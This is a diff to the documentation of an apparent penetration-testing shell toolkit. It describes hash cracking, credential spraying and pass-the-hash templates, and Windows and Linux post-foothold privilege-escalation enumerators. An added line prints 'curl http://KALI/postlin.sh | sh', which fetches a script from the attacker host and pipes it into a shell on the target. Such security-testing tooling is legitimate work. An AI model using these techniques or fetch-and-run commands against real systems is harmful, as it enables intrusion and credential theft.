@@ -197,7 +197,7 @@ Two defaults baked in: `--continue-on-success`, so it finds every valid key inst
 
 | | |
 |---|---|
-| `chash HASH` | Identifies it, says whether it is worth attacking, and prints the command. Both tools every time, hashcat first and john second, with full paths so the line pastes and runs. |
+| `chash HASH` | Identifies it, says whether it is worth attacking, and prints the command. Both tools every time, hashcat first and john second, with full paths so the line pastes and runs. A single string that is layered base64/hex of plain text is decoded and shown, not cracked (the double-base64 credential case). |
 | `chash FILE` | Same for a file. Groups by type, counts each one, and lists unrecognised lines with their line numbers. |
 | `chash FILE WORDLIST` | Wordlist instead of `/usr/share/wordlists/rockyou.txt`. |
 
@@ -284,6 +284,10 @@ CLSID lists for 2008 R2, 2012, 2016, 7 and 10 go in `~/tools/win/clsid/` with `t
 `__cred_guide` is the per-service playbook behind `creduse` and `spray`'s next steps: given a protocol and a credential it prints the command templates, most useful first, in password or pass-the-hash form. One table of services, the way `__chash_id` is one table of hashes. Do not call it directly.
 
 `__winpwn_post` writes `post.ps1`, the post-foothold Windows enumeration script `winpwn` stages. It lives inside a fish single-quoted string so `install.sh` needs no new file type; the price is that the PowerShell uses no single quotes and no doubled backslashes (regex backslashes are `\u005c`). Read-only on the target. Each finding prints a `>>` line with what it means and which alias to pull next: SeImpersonate names the potato for that build, `DefaultUserName` without `DefaultPassword` names the LSA secret and the two hives that hold it, `windows.old` names the secretsdump line and that the hashes want local auth, an unquoted service path lists the drop points with the ACL on each. Profiles are listed with hidden entries, `ConsoleHost_history.txt` is printed per user, services and scheduled tasks come with `icacls` on their binaries. Does not grep for the word password anywhere. `winpwn` prints the three ways to run it, all redirecting to `post.txt`, which is the evidence file for the report.
+
+`postlin.sh` is the Linux counterpart to `post.ps1`: a POSIX-sh, verdict-first post-foothold enumerator (sudo, SUID vs GTFOBins, writable sensitive files, cron targets you can write, config and history credentials, localhost sockets, kernel last). `pwncat` copies it into the served directory and prints `curl http://KALI/postlin.sh | sh`. Read section 8 first. Ships as a repo data file; `install.sh` copies it next to the functions.
+
+`__decode` peels layered base64 and hex off a string and prints each readable layer, stopping at plain text. `chash` calls it on a single bare string so a double-encoded password decodes instead of being mistaken for a hash. Never touches strings whose length matches a known digest. Do not call directly.
 
 `__snmpr_report` renders one `snmpr` walk file: parse, join the known tables, decode hex, list the leftover strings, diff against the previous walk. Python inside a fish function because the joins are a page of code. Do not call it directly.
 
